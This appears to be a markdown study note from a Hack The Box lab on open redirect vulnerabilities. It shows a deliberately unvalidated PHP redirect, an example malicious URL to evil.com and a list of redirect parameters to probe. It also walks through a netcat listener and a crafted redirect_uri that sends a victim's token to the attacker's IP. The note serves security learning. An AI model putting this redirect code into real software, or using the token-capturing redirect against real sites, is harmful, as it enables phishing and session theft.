---
title: k-Open Redirect
draft: false
tags:
---
An Open Redirect vulnerability occurs when an attacker can redirect a victim to an attacker-controlled site by abusing a legitimate application's redirection functionality. In such cases, all the attacker has to do is specify a website under their control in a redirection URL of a legitimate website and pass this URL to the victim. As you can imagine, this is possible when the legitimate application's redirection functionality does not perform any kind of validation regarding the websites to which the redirection points. From an attacker's perspective, an open redirect vulnerability can prove extremely useful during the initial access phase since it can lead victims to attacker-controlled web pages through a page that they trust.

```php
$red = $_GET['url'];
header("Location: " . $red);
```


```php
$red = $_GET['url'];
```

In the line of code above, a variable called _red_ is defined that gets its value from a parameter called _url_. _$_GET_ is a PHP superglobal variable that enables us to access the _url_ parameter value.

The malicious URL an attacker would send leveraging the Open Redirect vulnerability would look as follows: `trusted.site/index.php?url=https://evil.com`

Make sure you check for the following URL parameters when bug hunting, you'll often see them in login pages. Example: `/login.php?redirect=dashboard`

- ?url=
- ?link=
- ?redirect=
- ?redirecturl=
- ?redirect_uri=
- ?return=
- ?return_to=
- ?returnurl=
- ?go=
- ?goto=
- ?exit=
- ?exitpage=
- ?fromurl=
- ?fromuri=
- ?redirect_to=
- ?next=
- ?newurl=
- ?redir=


## Example

Navigate to `oredirect.htb.net`. You will come across a URL of the below format:

`http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>`

### Exploit
  
First, let us set up a Netcat listener.

```shell-session
jadu101@htb[/htb]$ nc -lvnp 1337
```

Edit the URL as follows:

`http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>`

